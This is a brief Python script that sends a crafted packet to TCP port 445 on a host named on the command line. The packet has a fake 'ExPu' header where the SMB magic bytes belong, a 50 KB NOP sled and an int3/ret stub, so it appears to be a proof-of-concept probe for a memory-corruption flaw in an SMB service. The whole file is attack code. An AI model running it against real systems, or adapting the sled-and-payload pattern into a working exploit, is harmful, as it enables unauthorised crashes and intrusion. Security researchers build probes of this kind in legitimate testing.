#!/usr/bin/env python3
import sys
import socket

smb =   b"ExPu"                  # 'ExPu' instead of '\xffSMB'
smb +=  b"\x90" * (1024 * 50)    # 50k nop sled
smb +=  b"\xcc\xc3"              # int 3; ret;

pkt = len(smb).to_bytes(4, byteorder='big') + smb

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 445))
s.sendall(pkt)
